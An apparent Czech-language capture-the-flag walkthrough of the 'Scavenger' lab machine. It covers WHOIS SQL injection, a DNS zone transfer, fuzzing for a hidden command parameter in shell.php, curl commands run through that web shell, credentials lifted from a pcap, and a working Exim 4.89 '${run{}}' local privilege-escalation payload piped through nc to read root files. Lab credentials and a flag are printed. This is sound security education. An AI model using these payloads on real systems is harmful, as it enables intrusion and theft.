---
layout: post
author: Tomáš Matějíček
title: "Scavenger"
date: 2021-01-09
tags: linux rce ssh php exploit enumeration
---
## Úvod a kontext

Scavenger stojí na propojení několika hostingových služeb, které na první pohled vypadají odděleně: WHOIS server na portu `43`, DNS, webový virtuální host `sec03.rentahacker.htb`, FTP úložiště s incidenty a lokální Exim.

Nejpoučnější je na tom právě rozhodovací logika. Žádný jednotlivý krok sám o sobě nestačil, ale každá služba vydala další část skládačky: WHOIS odhalil další domény, DNS zóna ukázala nový host, skrytý parametr v `shell.php` otevřel příkazy na serveru, poštovní schránky vydaly FTP přístupy a incidentní pcap pak dovedl k validnímu uživatelskému účtu.

## Počáteční průzkum

### Vyhledání otevřených portů

První scan ukázal nezvykle širokou sadu služeb pro jeden host: FTP, SMTP, WHOIS, DNS a web.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//)
echo $ports
nmap -p $ports -A -sC -sV -v $IP
```

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4
25/tcp open  smtp    Exim smtpd 4.89
43/tcp open  whois?
53/tcp open  domain  ISC BIND 9.10.3-P4
80/tcp open  http    Apache httpd 2.4.25
```

WHOIS služba vracela i část chybové hlášky z MariaDB. To je silná indicie, že dotaz končí v databázi a že má smysl ověřit injection. Obecnější kontext podobných infrastrukturních leaků rozebírám i v článku [WHOIS, DNS a AXFR jako reálná útočná plocha](/techniky/whois-dns-a-axfr-jako-realna-utokova-plocha).

### WHOIS a nové virtuální hosty

Pokus s rozbitým vstupem vrátil seznam dalších domén hostovaných na stejném serveru:

```bash
whois -h $IP "%') #"
```

```text
SUPERSECHOSTING.HTB
JUSTANOTHERBLOG.HTB
PWNHATS.HTB
RENTAHACKER.HTB
```

To je důležitý posun. Místo jedné statické stránky je z cíle najednou celý hosting s více zákazníky a větší šancí na slabší vedlejší aplikaci.

### DNS zone transfer

Další logický krok byl zkusit AXFR na jedné z nových zón. U `RENTAHACKER.HTB` to vyšlo:

```bash
dig AXFR RENTAHACKER.HTB @SUPERSECHOSTING.HTB
```

```text
sec03.rentahacker.htb
```

Praktickou roli `host` a `dig` při podobných DNS krocích rozebírám i v článku [host a dig](/nastroje/host-a-dig).

## Analýza zjištění

### `shell.php` a skrytý parametr `hidden`

Na hostu `sec03.rentahacker.htb` se objevila stránka `shell.php`. Parametr se nepřiznával přímo, ale šel doměřit brute-force přes názvy query parametrů.

```bash
dirsearch -u http://sec03.rentahacker.htb/ -e php
wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hl 0 \
  http://sec03.rentahacker.htb/shell.php?FUZZ=id
```

```text
sec03.rentahacker.htb/shell.php
hidden
```

Jakmile byl známý parametr `hidden`, šlo přes něj spouštět příkazy na hostu. To potvrdil i obsah poštovních schránek:

```bash
curl "http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/*"
```

```text
user: ib01ftp
pass: YhgRt56_Ta
```

Tady je důležité nepřeskočit význam toho zjištění. Poštovní schránky nevydaly „jen další heslo“, ale přímý přístup k interním incidentním souborům přes FTP. Přesně tenhle přechod od provozního artefaktu k dalšímu účtu rozebírám i v článku [Metadata, logy, incidentní a forenzní artefakty jako zdroj přístupů](/techniky/metadata-logy-incidentni-a-forenzni-artefakty-jako-zdroj-pristupu).

### Incidentní artefakty a reuse hesla

FTP přístup otevřel zachycený soubor `ib01c01_incident.pcap`, ze kterého šlo vyčíst další přihlašovací údaje:

```text
http://www.pwnhats.htb/admin530o6uisg
pwnhats@pwnhats.htb
GetYouAH4t!
```

Heslo `GetYouAH4t!` se pak ukázalo jako reuse i pro lokální účet `ib01c01` na FTP:

```bash
ftp ib01.supersechosting.htb
Name: ib01c01
Password: GetYouAH4t!
```

Praktickou roli `FTP` jako starého, ale pořád užitečného přenosového kanálu rozebírám i v článku [FTP](/nastroje/ftp).

Tím vznikl ověřený uživatelský přístup a bylo možné přečíst `user.txt`.

## Získání přístupu

### Stabilní uživatelský kontext

I když `shell.php` už uměla vykonávat příkazy, pro další práci byl důležitější autentizovaný přístup k účtu `ib01c01`. Ten potvrzuje, že útok nepřeskakuje rovnou k rootovi a že kompromitace zákaznického hostingu opravdu dopadla na konkrétní uživatelský účet.

## Eskalace oprávnění

### Lokální Exim 4.89

Na hostu běžel Exim 4.89 a z command execution v `shell.php` šlo spouštět lokální procesy proti `127.0.0.1:25`. To je důležitá kombinace: Exim nebylo nutné vystavovat jako vzdálené RCE, stačilo ho zneužít lokálně z už získaného code execution na stejném serveru. Přesně tento princip popisuje i článek [Lokálně dostupné služby po footholdu: localhost není boundary](/techniky/lokalne-dostupne-sluzby-po-footholdu-localhost-neni-boundary).

Předpřipravený payload využíval `${run{...}}` v adrese příjemce a nechal Exim zapsat obsah `root.txt` do dočasného souboru:

```bash
touch /dev/shm/flag
(sleep 0.1; echo HELO foo; sleep 0.1; echo 'MAIL FROM:<>'; sleep 0.1; \
 echo 'RCPT TO:<${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Froot\x2Froot.txt\x3E\x3E\x2Fdev\x2Fshm\x2Fflag\x22}}@localhost>'; \
 sleep 0.1; echo DATA; sleep 0.1; echo "Received: 1"; echo ""; echo "."; echo QUIT) | nc 127.0.0.1 25
```

Protože bylo nepraktické celý payload posílat ručně přes URL, šel nejdřív převést do base64 a na cíli dekódovat a spustit přes `shell.php`. Následně už stačilo přečíst výstup. Praktickou roli podobných jednoduchých TCP klientů a listenerů rozebírám i v článku [Netcat a nc](/nastroje/netcat-a-nc):

```bash
curl "http://sec03.rentahacker.htb/shell.php?hidden=cat+/dev/shm/flag"
```

```text
root.txt: 4a08d8174e9ec22b01d91ddb9a732b17
```

Tím se uzavírá celý řetězec: z SQL chyby ve WHOIS až k lokální privilege escalation přes Exim.

## Shrnutí klíčových poznatků

- První zásadní posun přišel z WHOIS služby na portu `43`, která prozradila databázové pozadí i další hostované domény.
- User část nevznikla jedním „magickým shellem“, ale postupným sběrem artefaktů: `shell.php` vydala poštovní schránky, ty vydaly FTP, FTP vydalo pcap a pcap přinesl reuse hesla pro `ib01c01`.
- Root část stála na lokálním zneužití Exim 4.89 z už existujícího command execution na stejném hostu.

## Co si odnést do praxe

- Pomocné služby jako WHOIS nebo zákaznické DNS zóny nesmí být mimo bezpečnostní review jen proto, že nejsou „hlavní aplikace“. Právě na nich se často objeví první slabá vazba.
- Incidentní artefakty a zachycené pcap soubory jsou vysoce citlivá data. Pokud se dostanou na FTP nebo jiný sdílený storage, často z nich uniknou hesla, URL administrací i celé provozní workflow.
- Lokální privilege escalation v mail serveru je problém i tehdy, když SMTP zvenku nepůsobí kriticky. Jakmile útočník získá libovolné lokální code execution, interní služby na `127.0.0.1` se okamžitě stávají součástí útoku.
